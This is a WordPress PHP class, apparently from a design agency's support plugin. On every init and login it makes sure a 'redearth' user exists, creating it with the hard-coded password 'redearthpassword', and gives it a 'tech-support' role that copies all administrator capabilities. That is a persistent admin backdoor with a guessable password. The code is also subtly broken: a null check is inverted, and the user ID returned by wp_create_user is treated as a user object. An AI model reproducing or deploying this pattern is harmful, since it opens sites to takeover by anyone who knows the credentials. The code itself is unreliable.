<?php
class Red_User {
  public static function init() {
    add_action( 'init', array( __CLASS__, 'red_add_tech_support_role' ) );
    add_action( 'wp_login', array( __CLASS__, 'add_tech_support_to_red_user' ) );
  }

  public static function get_red_user_logins() {
    return array( 'redearth', 'ootpsupport' );
  }

  public static function get_red_user() {
    $red_user = false;
    $red_user_login = get_option( 'red_user_login' );
    if ( ! $red_user_login ) {
      $red_user = get_user_by( 'login', $red_user_login );
    }

    /* If no user comes up we'll check to see if an alternative username exists */
    if ( ! $red_user ) {
      $users = get_users();
      foreach( $users as $user ) {
        if ( in_array( $user->user_login, self::get_red_user_logins() ) ) {
          $red_user = $user;
          update_option( 'red_user_login', $user->user_login ); // Update new user
          break;
        }
      }

      /* If no alternative user exists we'll create a new user */
      if ( ! $red_user ) {
        $red_user = wp_create_user( 'redearth', 'redearthpassword', 'support@redearthdesign.com' );

        /* Error message to prevent conflict saving to database if something went wrong */
        if ( is_wp_error( $red_user ) ) {
          write_log( 'Error creating redearth user' );
          write_log( $red_user );
        } else {
          update_option( 'red_user_login', $red_user->user_login ); // Update new user
        }
      }

    }

    return $red_user;
  }

  /**
   * NOTE: Add Tech Support role to $red_user automatically
   */
  function add_tech_support_to_red_user() {
  	$red_user = self::get_red_user();
  	if ( ! in_array( 'tech-support', (array) $red_user->roles ) ) {
  	  $red_user->add_role( 'tech-support' );
  	}
  }

  /**
   * Tech Support Role
   */
  function red_add_tech_support_role() {
  	add_role( 'tech-support', 'Tech Support', get_role( 'administrator' )->capabilities );
  }
}
Red_User::init();
